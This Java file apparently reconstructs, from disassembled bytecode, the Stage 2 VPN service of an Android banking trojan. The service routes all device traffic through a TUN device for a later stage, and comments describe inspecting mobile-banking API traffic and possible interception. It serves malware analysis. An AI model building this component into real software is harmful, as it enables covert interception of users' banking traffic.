/**
 * GOVV Banking Trojan — Stage 2 VPN Service
 * Reconstructed from DEX bytecode (androguard disassembly)
 *
 * Original class: Lcom/shell/a/PpVpn;
 * Package:        com.shell.a (Stage 2 — injected DEX)
 *
 * This is NOT the original source code.
 * It is a human-readable reconstruction of the bytecode behavior.
 *
 * PURPOSE: Intercept 100% of device network traffic.
 * Routes ALL packets (0.0.0.0/0) through a TUN device controlled
 * by Stage 3. This allows:
 *   - bKash API traffic inspection
 *   - DNS-based ad blocking (using ads.txt blocklist)
 *   - Potential MITM of unencrypted traffic
 *   - Traffic metadata collection (timing, volume, destinations)
 */
public class PpVpn extends VpnService {

    public static PpVpn instance;
    private ParcelFileDescriptor tun;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Don't restart if already running
        if (tun != null) {
            return START_STICKY;
        }

        try {
            VpnService.Builder builder = new VpnService.Builder();

            // Assign VPN interface address
            builder.addAddress("10.99.0.1", 32);

            // Route ALL traffic (0.0.0.0/0) through this VPN
            // This captures 100% of device internet traffic
            builder.addRoute("0.0.0.0", 0);

            // Establish TUN device
            tun = builder.establish();

            // Register singleton instance for Stage 3 access
            PpVpn.instance = this;

            // Internal log tag: "ShellA" — confirms malware family
            Log.i("ShellA", "PpVpn started, instance set");

        } catch (Exception e) {
            Log.e("ShellA", "VPN start failed: " + e.getMessage());
        }

        return START_STICKY;
    }

    public void stopVpn() {
        if (tun != null) {
            try {
                tun.close();
            } catch (Exception e) { }
            tun = null;
        }
    }

    @Override
    public void onRevoke() {
        stopVpn();
    }

    @Override
    public void onDestroy() {
        stopVpn();
        instance = null;
    }
}
